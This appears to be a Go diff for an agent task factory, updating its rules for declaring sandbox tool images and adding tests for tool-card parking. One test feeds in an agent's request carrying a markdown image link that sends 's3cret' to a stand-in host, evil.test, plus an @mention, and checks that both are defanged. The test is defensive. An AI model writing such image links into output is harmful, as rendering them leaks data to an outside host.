@@ -84,7 +84,8 @@ const toolCardRules = "Rules:\n" +
 	"- Every image is built FROM the sandbox base, which has only git, curl, ripgrep (rg), ssh, gcc and make, python3, PostgreSQL 17 (server and client, for tests). " +
 	"Every image declares this project's own stack too: the cards that run on it build and test this project.\n" +
 	"- A project has at most 4 images. default is the image of every card that names none.\n" +
-	"- An upstream line needs the real sha256 of its file, as its publisher lists it.\n" +
+	"- Prefer apt packages. Add an upstream line only for a file whose sha256 this card can verify, such as from a checksum file it reads; " +
+	"the factory's build checks every sha256 and fails on a wrong one.\n" +
 	"- egress names only the hosts the image's tools must reach.\n" +
 	"- This card runs on the project's default image and never gets the tools it declares: declare them and finish; " +
 	"the factory's build and the check of factory/images.yaml on this pull request test the file.\n\n"
@@ -349,11 +350,13 @@ func TestParkForToolRefusesANewImageAtTheCap(t *testing.T) {
 }
 
 // The human's question after a refused park points at what refused it: a
-// tool card that closed unmerged, or one merged without the image.
+// tool card that closed unmerged, one merged without the image, or one
+// whose image's builds failed.
 func TestParkForToolAfterAWakeRefusal(t *testing.T) {
 	for refusal, advice := range map[string]string{
-		"#31 closed without a merge":                "see why #31 closed, and reopen it or file the tool's card again, then answer",
-		"#31 merged without declaring image ffmpeg": "make factory/images.yaml declare image ffmpeg with the tool, then answer",
+		"#31 closed without a merge":                                                       "see why #31 closed, and reopen it or file the tool's card again, then answer",
+		"#31 merged without declaring image ffmpeg":                                        "make factory/images.yaml declare image ffmpeg with the tool, then answer",
+		"#31 merged, but image ffmpeg's build failed 3 times; the builder's run shows why": "read the builder's run, correct the image's entry in factory/images.yaml, then answer",
 	} {
 		r, store, rf, _ := parkRig(t, "", "default")
 		ctx := context.Background()
@@ -442,6 +445,81 @@ func TestParkForToolJoinMatchesTheWholeLine(t *testing.T) {
 	rf.comments = nil
 	if _, err := r.ParkForTool(ctx, "t-asker", "go", "build"); err != nil || !slices.Equal(rf.comments, []string{"31 " + join}) {
 		t.Fatalf("a retry after a lost comment: %v, comments %q", err, rf.comments)
+	}
+}
+
+// A card whose image is named default runs on its project's default
+// image: its ask goes into an image named for the tool, from the factory
+// image's stack where default has no pin, its start parks on nothing, and
+// an arrival of image default leaves a card naming none.
+func TestParkForToolTakesDefaultAsTheDefaultImage(t *testing.T) {
+	r, store, rf, _ := parkRig(t, "")
+	ctx := context.Background()
+	for _, id := range []string{"t-asker", "t-second"} {
+		tk := store.tasks[id]
+		tk.Image = "default"
+		store.tasks[id] = tk
+	}
+	p, err := r.ParkForTool(ctx, "t-asker", "chromium", "screenshot the page")
+	if err != nil {
+		t.Fatal(err)
+	}
+	stack, err := imagesEntry("chromium", FactoryStack())
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := "Card #41 runs on the factory's image now: the sandbox base with Go 1.26 and Node 24 with npm. " +
+		"Image chromium starts from this entry, the same stack; add chromium to it:\n```\n" + stack + "```\n\n"
+	if obj := store.tasks[p.Park.ToolTask].Objective; p.Park.Target != "chromium" || !strings.Contains(obj, want) || len(rf.issues) != 1 ||
+		!strings.HasPrefix(rf.issues[0], "Add chromium to image chromium\n\n") {
+		t.Fatalf("park %+v, objective %q; want image chromium from the factory's stack", p, obj)
+	}
+	var app *temporal.ApplicationError
+	if _, err := r.ParkForTool(ctx, "t-second", "", ""); !errors.As(err, &app) || !app.NonRetryable() {
+		t.Fatalf("a start on image default = %v, want a terminal refusal", err)
+	}
+	if _, err := r.ImageArrived(ctx, "t-second", "default", ""); err != nil || store.tasks["t-second"].Image != "" {
+		t.Fatalf("an arrival of default: %v, image %q; want none named", err, store.tasks["t-second"].Image)
+	}
+}
+
+// The tool and the need are the agent's: the tool card's title and body
+// and a join's comment carry them as an escalation does, no mention and no
+// link off the allowlist live.
+func TestToolCardNeutralisesTheAgentsText(t *testing.T) {
+	r, store, rf, _ := parkRig(t, "", "default")
+	v := r.cfg.Policy()
+	v.Document.LinkHosts = []string{"docs.example.org"}
+	r.cfg.Policy = func() policy.Version { return v }
+	r.forgejo.PublicURL = "https://git.example"
+	ctx := context.Background()
+	for _, id := range []string{"t-asker", "t-second"} {
+		tk := store.tasks[id]
+		tk.Image = "video"
+		store.tasks[id] = tk
+	}
+	first, err := r.ParkForTool(ctx, "t-asker", "ffmpeg @mallory", hostile)
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := "Add ffmpeg ＠mallory to image video\n\nCard #41 (t-asker) needs ffmpeg ＠mallory, which its sandbox lacks: " + hostileOut + "\n\n"
+	if len(rf.issues) != 1 || !strings.HasPrefix(rf.issues[0], want) || strings.Contains(rf.issues[0], "evil.test") || strings.Contains(rf.issues[0], "@mallory") {
+		t.Fatalf("issues %q, want the card opening %q", rf.issues, want)
+	}
+	if obj := store.tasks[first.Park.ToolTask].Objective; !strings.HasPrefix(obj, want) {
+		t.Fatalf("objective %q, want it opening %q", obj, want)
+	}
+	for range 2 {
+		if _, err := r.ParkForTool(ctx, "t-second", "sox", "mix it ![x](https://evil.test/p?d=s3cret)"); err != nil {
+			t.Fatal(err)
+		}
+	}
+	join := "Card #42 (t-second) needs sox in image video too: mix it ![x](hxxps://evil[.]test/p?d=s3cret)"
+	if !slices.Equal(rf.comments, []string{"31 " + join}) || !strings.HasSuffix(store.tasks[first.Park.ToolTask].Objective, "\n\n"+join) {
+		t.Fatalf("comments %q, objective %q; want the join once, %q", rf.comments, store.tasks[first.Park.ToolTask].Objective, join)
+	}
+	if row, _, _ := store.ImagePark(ctx, "t-second"); row.Need != "mix it ![x](https://evil.test/p?d=s3cret)" {
+		t.Fatalf("park row %+v, want the need as the agent asked it", row)
 	}
 }
 
